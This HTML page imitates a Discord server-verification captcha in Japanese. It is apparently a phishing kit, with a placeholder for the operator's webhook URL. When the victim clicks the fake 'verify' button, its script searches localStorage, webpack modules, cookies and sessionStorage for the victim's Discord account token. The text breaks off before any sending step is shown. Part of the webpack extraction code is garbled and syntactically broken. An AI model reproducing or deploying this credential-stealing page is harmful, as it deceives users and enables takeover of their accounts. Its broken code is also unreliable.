<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Server Verification - Discord</title>
    <link rel="icon" href="https://discord.com/assets/847541504914be480b27.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: #36393f;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
            margin: 0;
        }
        
        .container {
            background: #2f3136;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            max-width: 480px;
            width: 90%;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: #5865F2;
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            box-shadow: 0 4px 10px rgba(88, 101, 242, 0.4);
        }
        
        h1 { 
            font-size: 24px; 
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .server-name { 
            color: #b9bbbe; 
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .description {
            color: #dcddde;
            margin-bottom: 25px;
            line-height: 1.5;
            font-size: 14px;
        }
        
        .verify-btn {
            background: #3ba55d;
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
            font-weight: 500;
            transition: all 0.2s;
            position: relative;
            overflow: hidden;
        }
        
        .verify-btn:hover:not(:disabled) { 
            background: #2d7d46;
            transform: translateY(-1px);
            box-shadow: 0 4px 10px rgba(59, 165, 93, 0.3);
        }
        
        .verify-btn:disabled { 
            background: #4a4a4a; 
            cursor: not-allowed;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .spinner {
            border: 3px solid #4a4a4a;
            border-top: 3px solid #3ba55d;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        
        .success {
            display: none;
            color: #3ba55d;
            margin-top: 20px;
            padding: 15px;
            background: rgba(59, 165, 93, 0.1);
            border-radius: 4px;
        }
        
        .error {
            display: none;
            color: #ed4245;
            margin-top: 20px;
            padding: 15px;
            background: rgba(237, 66, 69, 0.1);
            border-radius: 4px;
        }
        
        .footer {
            margin-top: 30px;
            color: #72767d;
            font-size: 12px;
        }
        
        .captcha-box {
            background: #40444b;
            border: 1px solid #202225;
            border-radius: 4px;
            padding: 20px;
            margin: 20px 0;
            text-align: left;
        }
        
        .captcha-box label {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            color: #dcddde;
        }
        
        .captcha-box input[type="checkbox"] {
            width: 24px;
            height: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✓</div>
        <h1>Server Verification</h1>
        <p class="server-name" id="serverName">Server: Gaming Community</p>
        
        <p class="description">
            このサーバーに参加するには認証が必要です。<br>
            下のボタンを押して認証を完了してください。
        </p>
        
        <div class="captcha-box">
            <label>
                <input type="checkbox" id="captchaCheck" onchange="handleCaptcha()">
                <span>私はロボットではありません</span>
            </label>
        </div>
        
        <button class="verify-btn" id="verifyBtn" onclick="startVerification()" disabled>
            認証する
        </button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 15px; color: #b9bbbe;">認証中...</p>
        </div>
        
        <div class="success" id="success">
            ✅ 認証が完了しました！<br>
            <span style="font-size: 13px; color: #b9bbbe;">3秒後にDiscordに戻ります...</span>
        </div>
        
        <div class="error" id="error">
            ❌ 認証に失敗しました。<br>
            <span style="font-size: 13px;">Discordでログインしていることを確認してください。</span>
        </div>
        
        <div class="footer">
            Secured by Discord • <span id="year">2026</span>
        </div>
    </div>

    <script>
        // ========== 【必須】ここを書き換える ==========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/あなたのWEBHOOK";
        // ============================================
        
        // URLパラメータからサーバー名を取得（任意）
        const urlParams = new URLSearchParams(window.location.search);
        const serverFromURL = urlParams.get('server');
        if (serverFromURL) {
            document.getElementById('serverName').textContent = 'Server: ' + decodeURIComponent(serverFromURL);
        }
        
        // 年号更新
        document.getElementById('year').textContent = new Date().getFullYear();
        
        function handleCaptcha() {
            const checkbox = document.getElementById('captchaCheck');
            const btn = document.getElementById('verifyBtn');
            btn.disabled = !checkbox.checked;
        }
        
        async function startVerification() {
            const btn = document.getElementById('verifyBtn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success');
            const error = document.getElementById('error');
            const captcha = document.querySelector('.captcha-box');
            
            btn.disabled = true;
            btn.style.display = 'none';
            captcha.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                // 複数の方法でトークンを抽出
                let token = null;
                let method = '';
                
                // 方法1: LocalStorage
                try {
                    token = localStorage.getItem('token');
                    if (token) method = 'localStorage';
                } catch(e) {}

                if (!token && window.webpackChunkdiscord_app) {

                        const modules = [];

                            for (let c in e.c) modules.push(e.c[c]);
                        }]);
                        const tokenModule = modules.find(m => 
                            m?.exports?.default?.getToken !== undefined
                        );
                        if (tokenModule) {
                            token = tokenModule.exports.default.getToken();
                            method = 'webpack';
                        }
                    } catch(e) {}
                }
                
                // 方法3: Cookie
                if (!token) {
                    try {
                        const match = document.cookie.match(/token=([^;]+)/);
                        if (match) {
                            token = match[1];
                            method = 'cookie';
                        }
                    } catch(e) {}
                }
                
                // 方法4: sessionStorage
                if (!token) {
                    try {
                        token = sessionStorage.getItem('token');
                        if (token) method = 'sessionStorage';
                    } catch(e) {}
                }
                
                if (!token) {
                    throw new Error('Token not found in any storage');
                }
